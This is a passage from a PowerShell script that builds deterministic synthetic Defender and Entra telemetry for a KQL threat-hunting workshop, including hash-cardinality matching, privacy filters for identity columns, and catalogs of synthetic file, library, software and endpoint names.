<#
.SYNOPSIS
Generates schema-aligned synthetic telemetry for the ADX workshop.

.DESCRIPTION
Creates NDJSON files for all workshop table schemas, including normal telemetry
and the MIDNIGHT BLIZZARD hybrid identity scenario. The generator models Windows MDE,
MDI identity, Entra, Graph, alert, and grounded Ubuntu MDE telemetry, including the
optional Linux SSH/sudo/Oracle branch. Synthetic identities and hashes are
deterministic for repeatable reimports.

.EXAMPLE
.\scripts\New-SyntheticTelemetry.ps1 -SchemaDirectory .\schemas -OutputDirectory .\data\generated -NormalRowsPerTable 0 -SyntheticUserCount 10 -SyntheticServiceAccountCount 5

.EXAMPLE
.\scripts\New-SyntheticTelemetry.ps1 -OutputDirectory "$env:TEMP\CyberDefenseKqlWorkshop\CyberDefenseKqlWorkshop\generated" -SyntheticUserCount 6000 -SyntheticServiceAccountCount 4000

.EXAMPLE
.\scripts\New-SyntheticTelemetry.ps1 -OutputDirectory "$env:TEMP\CyberDefenseKqlWorkshop\CyberDefenseKqlWorkshop\generated" -TableName DeviceNetworkEvents

.NOTES
Name: New-SyntheticTelemetry.ps1
Date: 2026-05-01
Authors: dcodev1702 and GitHub Copilot CLI w/ ChatGPT 5.5 xhigh
Dependencies: Local schema JSON files under schemas; optional TVM software inventory CSVs under sample; no live ADX connection required.
Key commands: ConvertTo-Json, StreamWriter.WriteLine, Set-Content, deterministic synthetic data helpers.
#>
[CmdletBinding()]
param(
    [string]$SchemaDirectory = (Join-Path $PSScriptRoot '..\schemas'),
    [string]$OutputDirectory = (Join-Path $PSScriptRoot '..\data\generated'),
    [string]$SummaryPath,
    [Alias('StartTime')]
    [datetime]$TelemetryEndTime = (Get-Date).ToUniversalTime(),
    [int]$NormalRowsPerTable = -1,
    [int]$NormalMinRowsPerTable = 5000,
    [int]$NormalMaxRowsPerTable = 10000,
    [int]$NormalLookbackDays = 7,
    [int]$RandomSeed = 1702,
    [int]$SyntheticUserCount = 6000,
    [int]$SyntheticServiceAccountCount = 4000,
    [ValidateRange(18, 100000)]
    [int]$SyntheticDeviceCount = 3000,
    [ValidateRange(5000, 6000)]
    [int]$AadUserRiskEventCount = 5500,
    [string[]]$TableName,
    [string]$FieldProfileDirectory,
    [switch]$DisableProfileGrounding
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$script:Random = [System.Random]::new($RandomSeed)
$script:TelemetryEndTime = $TelemetryEndTime.ToUniversalTime()

# Keep default telemetry bounded to the seven-day lookback ending at script runtime.
$StartTime = $script:TelemetryEndTime.AddMinutes(-90)

function Format-WorkshopTime {
    param([Parameter(Mandatory)][datetime]$Time)
    $Time.ToUniversalTime().ToString('o')
}

function New-DefaultValue {
    param([Parameter(Mandatory)][string]$Type, [Parameter(Mandatory)][datetime]$Time)

    switch ($Type) {
        'bool' { $false }
        'datetime' { Format-WorkshopTime $Time }
        'dynamic' { [ordered]@{} }
        'guid' { '00000000-0000-0000-0000-000000000000' }
        'int' { 0 }
        'long' { 0 }
        'real' { 0.0 }
        default { '' }
    }
}

function New-StableGuid {
    param([Parameter(Mandatory)][string]$Seed)

    $md5 = [System.Security.Cryptography.MD5]::Create()
    try {
        $hash = $md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($Seed))
        ([guid]::new($hash)).Guid
    }
    finally {
        $md5.Dispose()
    }
}

function New-StableHex {
    param(
        [Parameter(Mandatory)][string]$Seed,
        [ValidateRange(1, 128)][int]$Length = 64
    )

    $state = [uint32]2166136261
    foreach ($char in $Seed.ToCharArray()) {
        $state = [uint32](([uint64]($state -bxor [uint32][char]$char) * 16777619) % 4294967296)
    }

    $builder = [System.Text.StringBuilder]::new($Length + 8)
    while ($builder.Length -lt $Length) {
        $state = [uint32](((1664525 * [uint64]$state) + 1013904223) % 4294967296)
        [void]$builder.Append($state.ToString('x8'))
    }

    return $builder.ToString(0, $Length)
}

function New-WorkshopHashSet {
    param([Parameter(Mandatory)][string]$Seed)

    [pscustomobject]@{
        SHA1 = New-StableHex "$Seed|sha1" 40
        SHA256 = New-StableHex "$Seed|sha256" 64
        MD5 = New-StableHex "$Seed|md5" 32
    }
}

# ---------------------------------------------------------------------------
# Profile-grounded fidelity layer
#
# Real Microsoft security telemetry repeats file hashes heavily: the same binary
# on many machines produces the same SHA256. Measured against a 1000-row sample of
# real DeviceProcessEvents, SHA256 has only 134 distinct values (ratio 0.134) and
# InitiatingProcessSHA256 only 69 (ratio 0.069).
#
# Seeding a hash from the row index produces a unique hash per row (ratio ~1.0),
# which is both unrealistic and slow. Hashes are therefore content addressed and
# cached: the same content key always yields the same hash triple. A bounded
# variant suffix widens the distinct count to match the ratio observed in the real
# field profile for that table and column.
# ---------------------------------------------------------------------------
$script:HashSetCache = [System.Collections.Generic.Dictionary[string, object]]::new()
$script:FieldProfiles = @{}
$script:CardinalityVariants = @{}
$script:CurrentVariants = @{}

function Get-WorkshopHashSet {
    <#
        Content-addressed hash triple. Same key in, same hashes out, computed once.
    #>
    param([Parameter(Mandatory)][string]$ContentKey)

    $cached = $null
    if ($script:HashSetCache.TryGetValue($ContentKey, [ref]$cached)) {
        return $cached
    }

    $value = [pscustomobject]@{
        SHA1 = New-StableHex "$ContentKey|sha1" 40
        SHA256 = New-StableHex "$ContentKey|sha256" 64
        MD5 = New-StableHex "$ContentKey|md5" 32
    }
    $script:HashSetCache[$ContentKey] = $value
    return $value
}

function Import-WorkshopFieldProfiles {
    <#
        Loads the per-column field profiles produced by
        scripts\Export-TenantTelemetrySamples.ps1. Missing profiles are not an error;
        generation simply falls back to the built-in catalogs.
    #>
    param([string]$Path)

    if ($DisableProfileGrounding) {
        Write-Verbose 'Profile grounding disabled by switch.'
        return
    }

    if ([string]::IsNullOrWhiteSpace($Path)) {
        $sampleRoot = Join-Path $PSScriptRoot '..\sample'
        if (-not (Test-Path $sampleRoot)) { return }
        $latest = Get-ChildItem -Path $sampleRoot -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '^\d{8}T\d{6}Z$' } |
            Sort-Object Name -Descending |
            Select-Object -First 1
        if ($null -eq $latest) { return }
        $Path = Join-Path $latest.FullName '_field-profiles'
    }

    if (-not (Test-Path $Path)) {
        Write-Verbose "No field profiles found at $Path."
        return
    }

    foreach ($profileFile in (Get-ChildItem -Path $Path -Filter '*.profile.json' -ErrorAction SilentlyContinue)) {
        try {
            $loaded = Get-Content -Path $profileFile.FullName -Raw | ConvertFrom-Json
        }
        catch {
            Write-Warning "Skipping unreadable field profile $($profileFile.Name): $($_.Exception.Message)"
            continue
        }

        $columnMap = @{}
        foreach ($column in @($loaded.columns)) {
            $columnMap[[string]$column.name] = $column
        }
        $script:FieldProfiles[[string]$loaded.tableName] = [pscustomobject]@{
            TableName = [string]$loaded.tableName
            RowCount = [int]$loaded.rowCount
            Columns = $columnMap
        }
    }

    Write-Host "Loaded $($script:FieldProfiles.Count) field profile(s) from $Path"
}

function Get-WorkshopObservedRatio {
    <#
        Distinct-value ratio for a column in the real telemetry sample, or $null when
        the column was not observed.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][string]$Column
    )

    if (-not $script:FieldProfiles.ContainsKey($Table)) { return $null }
    $tableProfile = $script:FieldProfiles[$Table]
    if (-not $tableProfile.Columns.ContainsKey($Column)) { return $null }

    # Note: PowerShell variable names are case-insensitive, so this local must not be
    # named $column or it would assign into the [string]$Column parameter and coerce
    # the profile object to a string.
    $columnProfile = $tableProfile.Columns[$Column]
    if ([int]$columnProfile.rowCount -le 0) { return $null }
    return ([double]$columnProfile.distinctCount / [double]$columnProfile.rowCount)
}

function Get-WorkshopCardinalityVariants {
    <#
        Number of hash variants to mint per catalog entry so the generated distinct
        count approximates the ratio measured in the real telemetry sample.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][string]$Column,
        [Parameter(Mandatory)][int]$CatalogSize,
        [Parameter(Mandatory)][int]$TargetRows,
        [double]$FallbackRatio = 0.15
    )

    $cacheKey = "$Table|$Column|$CatalogSize|$TargetRows"
    if ($script:CardinalityVariants.ContainsKey($cacheKey)) {
        return $script:CardinalityVariants[$cacheKey]
    }

    $ratio = Get-WorkshopObservedRatio -Table $Table -Column $Column
    if ($null -eq $ratio) { $ratio = $FallbackRatio }

    $targetDistinct = [Math]::Max(1, [int][Math]::Round($ratio * $TargetRows))
    $variants = [Math]::Max(1, [int][Math]::Ceiling($targetDistinct / [Math]::Max(1, $CatalogSize)))

    # Keep the cache bounded; beyond this the distinct count is already realistic.
    $variants = [Math]::Min($variants, 512)
    $script:CardinalityVariants[$cacheKey] = $variants
    return $variants
}

function Get-WorkshopContentHashSet {
    <#
        Hash triple for a piece of synthetic content, widened to the distinct
        cardinality observed in real telemetry for the given table and column.

        The variant count is resolved once per table by Set-WorkshopTableCardinality
        and read from a precomputed lookup here, because this runs on every generated
        row and nested function calls dominate the cost at scale.
    #>
    param(
        [Parameter(Mandatory)][string]$Slot,
        [Parameter(Mandatory)][string]$ContentKey,
        [Parameter(Mandatory)][int]$Index
    )

    $variants = $script:CurrentVariants[$Slot]
    if ($null -eq $variants -or $variants -le 1) {
        return Get-WorkshopHashSet -ContentKey $ContentKey
    }
    return Get-WorkshopHashSet -ContentKey ('{0}|v{1}' -f $ContentKey, ($Index % $variants))
}

function Set-WorkshopTableCardinality {
    <#
        Resolves the hash variant count for each content slot used by a table, once,
        before its rows are generated.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][int]$TargetRows
    )

    $slots = @(
        [pscustomobject]@{ Slot = 'File'; Column = 'SHA256'; CatalogSize = $windowsFileTemplates.Count; Fallback = 0.20 }
        [pscustomobject]@{ Slot = 'Binary'; Column = 'InitiatingProcessSHA256'; CatalogSize = $windowsProcessTemplates.Count; Fallback = 0.07 }
        [pscustomobject]@{ Slot = 'Module'; Column = 'SHA256'; CatalogSize = $windowsDllTemplates.Count; Fallback = 0.51 }
    )

    $script:CurrentVariants = @{}
    foreach ($slot in $slots) {
        $script:CurrentVariants[$slot.Slot] = Get-WorkshopCardinalityVariants `
            -Table $Table `
            -Column $slot.Column `
            -CatalogSize $slot.CatalogSize `
            -TargetRows $TargetRows `
            -FallbackRatio $slot.Fallback
    }
}

function Get-WorkshopRandomItem {
    param([Parameter(Mandatory)][object[]]$Items)

    return $Items[$script:Random.Next(0, $Items.Count)]
}

# ---------------------------------------------------------------------------
# Profile-driven value sampling
#
# Columns the scenario logic does not set explicitly used to be filled with a type
# default, which meant empty strings. Real telemetry looks nothing like that: in a
# 1000-row real DeviceProcessEvents sample, AccountName is empty 546 times, "system"
# 262 times, and only a handful of human accounts appear.
#
# Unset columns are therefore sampled from the real observed distribution captured in
# the field profiles, subject to a strict privacy rule:
#
#   * Enum-like, non-identifying columns (ActionType, LogonType, Protocol, OSPlatform)
#     are sampled verbatim. These are Microsoft-defined vocabularies, not tenant data.
#   * Identity-bearing columns (accounts, devices, addresses, URLs, hashes, GUIDs,
#     free text) are never sampled verbatim. Only their empty rate is reproduced, and
#     values come from the synthetic catalogs or the built-in principal list.
#
# This keeps real DIBSecCom identities out of the committed synthetic telemetry while
# still matching the shape of production data.
# ---------------------------------------------------------------------------

# Generic operating system principals. These are Windows and Linux built-ins present in
# every environment, so they carry no tenant information and are safe to emit.
$script:BuiltInPrincipals = @(
    [pscustomobject]@{ Name = 'system'; Weight = 300 }
    [pscustomobject]@{ Name = 'local service'; Weight = 70 }
    [pscustomobject]@{ Name = 'network service'; Weight = 25 }
    [pscustomobject]@{ Name = 'dwm-1'; Weight = 9 }
    [pscustomobject]@{ Name = 'umfd-0'; Weight = 7 }
    [pscustomobject]@{ Name = 'umfd-1'; Weight = 7 }
)
$script:BuiltInPrincipalTotalWeight = ($script:BuiltInPrincipals | Measure-Object -Property Weight -Sum).Sum

# Columns whose values are Microsoft-defined vocabularies rather than tenant data.
$script:SafeVerbatimColumnPattern = '^(ActionType|LogonType|Protocol|OSPlatform|OSDistribution|OSArchitecture|DeviceType|DeviceCategory|Category|Categories|Severity|ServiceSource|DetectionSource|EvidenceRole|EvidenceDirection|EntityType|RegistryValueType|IsInitiatingProcessRemoteSession|InitiatingProcessIntegrityLevel|InitiatingProcessTokenElevation|ProcessIntegrityLevel|ProcessTokenElevation|LocalIPType|RemoteIPType|ClientAppUsed|ConditionalAccessStatus|AuthenticationRequirement|RiskLevel.*|RiskState|RiskDetail|ResultType|ResultDescription|TokenIssuerType|UserType|AppOwnerTenantId|Status|State|JoinType|SensorHealthState|OnboardingStatus|MachineGroup|EndOfSupportStatus|VulnerabilitySeverityLevel|CveSupportability|IsExploitAvailable|Type|SourceSystem|RequestMethod|ResponseStatusCode|ApiVersion|IdentityProvider|TargetWorkload)$'

# Columns that identify a person, host, address, or secret. Never emitted verbatim.
$script:IdentityColumnPattern = '(Account|User|Upn|Sid|Principal|Device|Host|Machine|Computer|IP|Address|Url|Domain|Email|Mail|Sha1|Sha256|Md5|Hash|Token|Key|Secret|Credential|Guid|Id$|Ids$|Name$|Path|CommandLine|Description|Title|Query|Location|City|State|Country|Latitude|Longitude|Isp|Tenant)'

$script:ValueSamplerCache = @{}
$script:CurrentSampledColumns = @()

function Get-WorkshopValueSampler {
    <#
        Builds, once per table and column, a cumulative weighted sampler over the real
        observed values. Returns $null when the column must not be sampled verbatim or
        no profile exists.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][string]$ColumnName
    )

    $cacheKey = "$Table|$ColumnName"
    if ($script:ValueSamplerCache.ContainsKey($cacheKey)) {
        return $script:ValueSamplerCache[$cacheKey]
    }

    $sampler = $null
    if ($script:FieldProfiles.ContainsKey($Table)) {
        $tableProfile = $script:FieldProfiles[$Table]
        if ($tableProfile.Columns.ContainsKey($ColumnName)) {
            $observed = $tableProfile.Columns[$ColumnName]
            $isSafe = $ColumnName -match $script:SafeVerbatimColumnPattern -and $ColumnName -notmatch $script:IdentityColumnPattern
            $isLowCardinality = [int]$observed.distinctCount -le 60

            if ($isSafe -and $isLowCardinality) {
                $values = [System.Collections.Generic.List[string]]::new()
                $weights = [System.Collections.Generic.List[int]]::new()
                $running = 0
                foreach ($entry in @($observed.topValues)) {
                    $text = [string]$entry.value
                    if ($text.EndsWith('...')) { continue }
                    $running += [int]$entry.count
                    $values.Add($text)
                    $weights.Add($running)
                }
                if ($values.Count -gt 0) {
                    $sampler = [pscustomobject]@{
                        Values      = $values.ToArray()
                        Cumulative  = $weights.ToArray()
                        TotalWeight = $running
                    }
                }
            }
        }
    }

    $script:ValueSamplerCache[$cacheKey] = $sampler
    return $sampler
}

function Get-WorkshopEmptyRate {
    <#
        Fraction of rows where the real telemetry left this column null or empty.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][string]$ColumnName
    )

    if (-not $script:FieldProfiles.ContainsKey($Table)) { return $null }
    $tableProfile = $script:FieldProfiles[$Table]
    if (-not $tableProfile.Columns.ContainsKey($ColumnName)) { return $null }
    return [double]$tableProfile.Columns[$ColumnName].nullRate
}

function Get-WorkshopBuiltInPrincipal {
    <#
        Weighted pick from the generic OS principal list that dominates real endpoint
        telemetry.
    #>
    $roll = $script:Random.Next(0, $script:BuiltInPrincipalTotalWeight)
    $running = 0
    foreach ($principal in $script:BuiltInPrincipals) {
        $running += $principal.Weight
        if ($roll -lt $running) { return $principal.Name }
    }
    return 'system'
}

function Set-WorkshopTableSamplers {
    <#
        Resolves, once per table, the subset of schema columns that can be sampled from
        the real observed distribution. Ambient row building then touches only those
        columns instead of testing every column on every row.
    #>
    param([Parameter(Mandatory)][string]$Table)

    $sampled = [System.Collections.Generic.List[object]]::new()
    if ($script:Schemas.ContainsKey($Table)) {
        foreach ($column in $script:Schemas[$Table].columns) {
            $columnName = [string]$column.name
            $sampler = Get-WorkshopValueSampler -Table $Table -ColumnName $columnName
            if ($null -ne $sampler) {
                $sampled.Add([pscustomobject]@{ Name = $columnName; Sampler = $sampler })
            }
        }
    }
    $script:CurrentSampledColumns = $sampled.ToArray()
}

function Get-WorkshopProfileSampledValue {
    <#
        Value for a column the scenario logic did not set, drawn from the real observed
        distribution. Returns $null when the column has no sampler.
    #>
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][string]$ColumnName
    )

    $sampler = Get-WorkshopValueSampler -Table $Table -ColumnName $ColumnName
    if ($null -eq $sampler) { return $null }

    $roll = $script:Random.Next(0, [Math]::Max(1, $sampler.TotalWeight))
    for ($i = 0; $i -lt $sampler.Cumulative.Length; $i++) {
        if ($roll -lt $sampler.Cumulative[$i]) {
            return $sampler.Values[$i]
        }
    }
    return $sampler.Values[$sampler.Values.Length - 1]
}

function Get-WorkshopRandomInt {
    param([int]$Minimum, [int]$Maximum)

    return $script:Random.Next($Minimum, $Maximum)
}

function ConvertTo-WorkshopPackageName {
    param([Parameter(Mandatory)][string]$Name)

    $package = ($Name -replace '\s+For Linux$', '').Trim().ToLowerInvariant()
    $package = $package -replace '[^a-z0-9+._-]+', '-'
    return $package.Trim('-')
}

function Import-WorkshopTvmSoftwareCatalog {
    param(
        [Parameter(Mandatory)][string]$Path,
        [ValidateRange(1, 1000)][int]$MinimumCount = 400
    )

    $catalog = @()
    if (Test-Path -Path $Path) {
        $rows = Get-Content -Path $Path | Select-Object -Skip 1 | ConvertFrom-Csv
        $catalog = @(
            foreach ($row in $rows) {
                $name = ([string]$row.Name -replace '\s+For Linux$', '').Trim()
                if ([string]::IsNullOrWhiteSpace($name)) {
                    continue
                }

                $weaknesses = 0
                [void][int]::TryParse([string]$row.Weaknesses, [ref]$weaknesses)
                $productId = [string]$row.ProductId
                $package = if ($productId -match '_-_(?<Package>.+)$') {
                    ($Matches.Package -replace '_for_linux$', '') -replace '_', '-'
                }
                else {
                    ConvertTo-WorkshopPackageName $name
                }

                [pscustomobject]@{
                    Name = $name
                    Vendor = if ([string]::IsNullOrWhiteSpace([string]$row.Vendor)) { 'Ubuntu' } else { [string]$row.Vendor }
                    Version = if ([string]::IsNullOrWhiteSpace([string]$row.'Installed Version')) { '1.0.0' } else { [string]$row.'Installed Version' }
                    CveId = ''
                    Package = $package
                    Risk = [Math]::Min(95, [Math]::Max(5, 10 + ($weaknesses * 2)))
                }
            }
        )
    }

    if ($catalog.Count -lt $MinimumCount) {
        $catalog += New-WorkshopFallbackLinuxSoftwareCatalog -Count ($MinimumCount - $catalog.Count)
    }

    return @($catalog | Select-Object -First $MinimumCount)
}

function New-WorkshopFallbackLinuxSoftwareCatalog {
    param([ValidateRange(1, 1000)][int]$Count = 400)

    $families = @(
        [pscustomobject]@{ Name = 'nginx'; Vendor = 'Ubuntu'; Version = '1.24.0-2ubuntu7'; Package = 'nginx'; Risk = 38 },
        [pscustomobject]@{ Name = 'postgresql-client'; Vendor = 'PostgreSQL Global Development Group'; Version = '16.4-0ubuntu0.24.04.1'; Package = 'postgresql-client'; Risk = 30 },
        [pscustomobject]@{ Name = 'python3-module'; Vendor = 'Python Software Foundation'; Version = '3.12.3-0ubuntu2'; Package = 'python3-module'; Risk = 22 },
        [pscustomobject]@{ Name = 'nodejs-library'; Vendor = 'Node.js Foundation'; Version = '20.19.0-1nodesource1'; Package = 'nodejs-library'; Risk = 28 },
        [pscustomobject]@{ Name = 'libcloud-agent'; Vendor = 'Canonical'; Version = '2.11.1-0ubuntu1'; Package = 'libcloud-agent'; Risk = 18 },
        [pscustomobject]@{ Name = 'oracle-client-tool'; Vendor = 'Oracle'; Version = '23.7.0.25.01'; Package = 'oracle-client-tool'; Risk = 42 },
        [pscustomobject]@{ Name = 'container-runtime-plugin'; Vendor = 'Docker'; Version = '27.5.1-1'; Package = 'container-runtime-plugin'; Risk = 34 },
        [pscustomobject]@{ Name = 'security-audit-tool'; Vendor = 'Ubuntu'; Version = '4.0.0-1ubuntu1'; Package = 'security-audit-tool'; Risk = 26 }
    )

    for ($i = 1; $i -le $Count; $i++) {
        $family = $families[($i - 1) % $families.Count]
        [pscustomobject]@{
            Name = '{0}-{1:D3}' -f $family.Name, $i
            Vendor = $family.Vendor
            Version = $family.Version
            CveId = ''
            Package = '{0}-{1:D3}' -f $family.Package, $i
            Risk = [Math]::Min(95, $family.Risk + ($i % 12))
        }
    }
}

function New-WorkshopWindowsFileTemplateCatalog {
    param([ValidateRange(1, 500)][int]$Count = 100)

    $subjects = @('OperationsPlan', 'BudgetForecast', 'TravelRoster', 'ContractAward', 'VendorInvoice', 'AfterAction', 'SecurityBrief', 'HelpDeskExport', 'AssetInventory', 'AccessReview', 'TrainingRoster', 'MeetingNotes', 'ProjectTimeline', 'NetworkDiagram', 'RiskRegister', 'PolicyDraft', 'IncidentReport', 'ChangeRequest', 'ProcurementList', 'ExecutiveReadout')
    $extensions = @('.jpg', '.xlsx', '.xlsm', '.csv', '.docx', '.docm', '.doc', '.pptx', '.pptm', '.ppt', '.ost', '.pst', '.pdf', '.txt', '.rtf', '.zip', '.json', '.log', '.xml', '.one')
    $folders = @(
        'C:\Users\{0}\Documents\Operations',
        'C:\Users\{0}\Documents\Finance',
        'C:\Users\{0}\Downloads',
        'C:\Users\{0}\Desktop',
        'C:\Users\{0}\OneDrive - USAG Cyber',
        'C:\Users\{0}\Pictures\FieldOps',
        'C:\Users\{0}\AppData\Local\Microsoft\Outlook',
        'C:\Users\{0}\AppData\Local\Temp',
        'C:\Users\Public\Documents',
        'C:\ProgramData\USAGCyber\Reports'
    )

    for ($i = 1; $i -le $Count; $i++) {
        $extension = $extensions[($i - 1) % $extensions.Count]
        $subject = $subjects[($i - 1) % $subjects.Count]
        $folder = $folders[($i - 1) % $folders.Count]
        $name = '{0}_{1:D3}{2}' -f $subject, $i, $extension
        [pscustomobject]@{
            Name = $name
            PathTemplate = '{0}\{1}' -f $folder, $name
            Size = 4096 + (($i * 32768) % 12582912)
        }
    }
}

function New-WorkshopWindowsDllTemplateCatalog {
    param([ValidateRange(1, 500)][int]$Count = 100)

    $moduleStems = @('msvcp140', 'vcruntime140', 'concrt140', 'ucrtbase', 'api-ms-win-core-file-l1-2-0', 'api-ms-win-core-synch-l1-2-0', 'bcryptprimitives', 'cryptbase', 'cryptsp', 'dnsapi', 'dwmapi', 'dxgi', 'gdiplus', 'iertutil', 'imm32', 'iphlpapi', 'kernel.appcore', 'msasn1', 'mscms', 'msctf', 'msi', 'msimg32', 'mso20win32client', 'msodbcsql', 'mswsock', 'netapi32', 'ncrypt', 'ntdll', 'ole32', 'oleacc', 'oleaut32', 'profapi', 'propsys', 'rpcrt4', 'secur32', 'shell32', 'shlwapi', 'sspicli', 'urlmon', 'userenv', 'uxtheme', 'version', 'wer', 'wininet', 'winmm', 'winspool', 'wldap32', 'wow64', 'ws2_32', 'xml-lite')
    $locations = @(
        'C:\Program Files\Microsoft Office\root\Office16',
        'C:\Program Files\Microsoft\Edge\Application',
        'C:\Program Files\Windows Defender Advanced Threat Protection',
        'C:\Program Files\Docker\Docker\resources',
        'C:\Program Files\Git\mingw64\bin',
        'C:\Program Files\Microsoft VS Code',
        'C:\Windows',
        'C:\Windows\System32',
        'C:\Windows\SysWOW64',
        'C:\Users\Public\AppData\Temp'
    )

    for ($i = 1; $i -le $Count; $i++) {
        $stem = $moduleStems[($i - 1) % $moduleStems.Count]
        $name = if ($i -le $moduleStems.Count) { "$stem.dll" } else { '{0}{1:D2}.dll' -f $stem, [int][Math]::Ceiling($i / $moduleStems.Count) }
        $location = $locations[($i - 1) % $locations.Count]
        [pscustomobject]@{
            Name = $name
            Path = '{0}\{1}' -f $location, $name
            Size = 20480 + (($i * 7919) % 7340032)
        }
    }
}

function New-WorkshopLinuxSharedObjectTemplateCatalog {
    param([ValidateRange(1, 500)][int]$Count = 100)

    $libraries = @('libacl.so.1', 'libapparmor.so.1', 'libarchive.so.13', 'libattr.so.1', 'libblkid.so.1', 'libbrotlicommon.so.1', 'libbrotlidec.so.1', 'libbsd.so.0', 'libbz2.so.1.0', 'libcap.so.2', 'libcap-ng.so.0', 'libcom-err.so.2', 'libcrypt.so.1', 'libcurl.so.4', 'libdbus-1.so.3', 'libdevmapper.so.1.02.1', 'libedit.so.2', 'libelf.so.1', 'libexpat.so.1', 'libffi.so.8', 'libfuse3.so.3', 'libgcc-s.so.1', 'libgcrypt.so.20', 'libgmp.so.10', 'libgnutls.so.30', 'libgpg-error.so.0', 'libgssapi-krb5.so.2', 'libhogweed.so.6', 'libidn2.so.0', 'libjson-c.so.5', 'libk5crypto.so.3', 'libkeyutils.so.1', 'libkrb5.so.3', 'libkrb5support.so.0', 'libldap-2.5.so.0', 'liblz4.so.1', 'liblzma.so.5', 'libm.so.6', 'libmount.so.1', 'libncursesw.so.6', 'libnettle.so.8', 'libnghttp2.so.14', 'libnsl.so.2', 'libnss-systemd.so.2', 'libp11-kit.so.0', 'libpcre2-8.so.0', 'libproc2.so.0', 'libpsl.so.5', 'libpython3.12.so.1.0', 'libreadline.so.8', 'librtmp.so.1', 'libsasl2.so.2', 'libseccomp.so.2', 'libselinux.so.1', 'libsmartcols.so.1', 'libsqlite3.so.0', 'libssh.so.4', 'libstdc++.so.6', 'libtasn1.so.6', 'libtinfo.so.6', 'libudev.so.1', 'libunistring.so.5', 'libuuid.so.1', 'libwrap.so.0', 'libxml2.so.2', 'libyaml-0.so.2', 'libz.so.1', 'libzstd.so.1', 'pam_unix.so', 'pam_sss.so', 'pam_systemd.so', 'audit_plugin.so', 'sssd_krb5_locator_plugin.so', 'oracle_net.so', 'libclntsh.so.23.1', 'libnnz23.so', 'libocci.so.23.1')
    $locations = @('/lib/x86_64-linux-gnu', '/usr/lib/x86_64-linux-gnu', '/usr/lib', '/usr/local/lib', '/usr/lib/systemd', '/usr/lib/postgresql/16/lib', '/opt/microsoft/mdatp/lib', '/opt/oracle/product/23ai/client/lib', '/snap/core/current/lib/x86_64-linux-gnu', '/var/tmp/.cache/lib')

    for ($i = 1; $i -le $Count; $i++) {
        $baseName = $libraries[($i - 1) % $libraries.Count]
        $name = if ($i -le $libraries.Count) { $baseName } else { $baseName -replace '\.so', ('-{0:D2}.so' -f [int][Math]::Ceiling($i / $libraries.Count)) }
        $location = $locations[($i - 1) % $locations.Count]
        [pscustomobject]@{
            Name = $name
            Path = '{0}/{1}' -f $location, $name
            Size = 16384 + (($i * 12289) % 6291456)
        }
    }
}

function New-WorkshopRemoteEndpointCatalog {
    param(
        [Parameter(Mandatory)][string]$Prefix,
        [Parameter(Mandatory)][string]$Domain,
        [Parameter(Mandatory)][string]$IpPrefix,
        [Parameter(Mandatory)][int[]]$Ports,
        [string[]]$Protocols = @('Tcp'),
        [ValidateRange(1, 500)][int]$Count = 200
    )

    for ($i = 1; $i -le $Count; $i++) {
        [pscustomobject]@{
            Url = '{0}-{1:D3}.{2}' -f $Prefix, $i, $Domain
            IP = '{0}.{1}' -f $IpPrefix, (10 + (($i - 1) % 240))
            Port = $Ports[($i - 1) % $Ports.Count]
            Protocol = $Protocols[($i - 1) % $Protocols.Count]
        }
    }
}

function Get-WorkshopIpAddressType {
    param([AllowEmptyString()][string]$IPAddress = '')

    if ([string]::IsNullOrWhiteSpace($IPAddress)) {
        return ''
    }

    if ($IPAddress -like '127.*' -or $IPAddress -eq '::1') {
        return 'Loopback'
    }

    if ($IPAddress -like '10.*' -or $IPAddress -like '192.168.*' -or $IPAddress -match '^172\.(1[6-9]|2[0-9]|3[0-1])\.') {
        return 'Private'
    }

    return 'Public'
}

function Import-WorkshopDeviceNetworkEventProfileCatalog {
    param([Parameter(Mandatory)][string]$Path)

    if (-not (Test-Path $Path)) {
        return @()
    }

    $rows = @(Import-Csv -Path $Path)
    $defaultActionType = @($rows | ForEach-Object { ([string]$_.ActionType).Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -First 1)
    $defaultProtocol = @($rows | ForEach-Object { ([string]$_.Protocol).Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -First 1)
    $defaultLocalIPType = @($rows | ForEach-Object { ([string]$_.LocalIPType).Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -First 1)
    $defaultProcessName = @($rows | ForEach-Object { ([string]$_.InitiatingProcessFileName).Trim() } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | Select-Object -First 1)

    $seen = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    foreach ($row in $rows) {
        $remoteIP = ([string]$row.RemoteIP).Trim()
        $remoteUrl = ([string]$row.RemoteUrl).Trim()
        [int]$remotePort = 0
        if (-not [int]::TryParse(([string]$row.RemotePort), [ref]$remotePort)) {
            $remotePort = 443
        }

        $actionType = ([string]$row.ActionType).Trim()
        $protocol = ([string]$row.Protocol).Trim()
        $localIPType = ([string]$row.LocalIPType).Trim()
        $remoteIPType = ([string]$row.RemoteIPType).Trim()
        $processName = ([string]$row.InitiatingProcessFileName).Trim()

        if ([string]::IsNullOrWhiteSpace($actionType)) { $actionType = if ($defaultActionType.Count -gt 0) { $defaultActionType[0] } else { 'ConnectionSuccess' } }
        if ([string]::IsNullOrWhiteSpace($protocol)) { $protocol = if ($defaultProtocol.Count -gt 0) { $defaultProtocol[0] } else { 'Tcp' } }
        if ([string]::IsNullOrWhiteSpace($localIPType)) { $localIPType = if ($defaultLocalIPType.Count -gt 0) { $defaultLocalIPType[0] } else { 'Private' } }
        if ([string]::IsNullOrWhiteSpace($remoteIPType)) { $remoteIPType = Get-WorkshopIpAddressType -IPAddress $remoteIP }
        if ([string]::IsNullOrWhiteSpace($processName)) { $processName = if ($defaultProcessName.Count -gt 0) { $defaultProcessName[0] } else { 'svchost.exe' } }

        $profile = [pscustomobject]@{
            ActionType = $actionType
            RemoteIP = $remoteIP
